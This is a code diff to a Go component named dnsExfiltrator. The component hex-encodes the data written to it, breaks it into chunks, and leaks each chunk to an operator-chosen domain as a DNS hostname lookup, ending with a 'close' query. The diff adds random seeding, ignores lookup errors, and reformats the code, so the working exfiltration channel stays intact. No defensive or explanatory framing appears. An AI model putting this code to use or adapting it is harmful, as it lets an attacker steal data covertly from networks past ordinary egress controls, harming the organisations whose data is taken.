@@ -6,6 +6,7 @@ import (
 	"math/rand"
 	"net"
 	"strings"
+	"time"
 )
 
 const (
@@ -19,22 +20,27 @@ type dnsExfiltrator struct {
 }
 
 func newDNSExfiltrator(host string) (*dnsExfiltrator, error) {
+	rand.Seed(time.Now().UnixNano())
 	return &dnsExfiltrator{strings.Trim(host, " ")}, nil
 }
 
 func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
 	fmt.Printf("DNSExfil: writing: %s\n", string(data))
+
 	payload := hex.EncodeToString(data)
 	postfix := generateMessageID() + "." + ex.host
+
 	// count 3 dots, not sure if necessary
 	availableSpace := min(maxSubDomainLength, maxDomainLength-(len(postfix)+dnsMessageIDLength+3))
 
 	for len(payload) > 0 {
 		chunkLength := min(len(payload), availableSpace)
-		net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
+		_, _ = net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
 		payload = payload[chunkLength:]
 	}
-	net.LookupHost(fmt.Sprintf("close.%s", postfix))
+
+	_, _ = net.LookupHost(fmt.Sprintf("close.%s", postfix))
+
 	return len(data), nil
 }
 
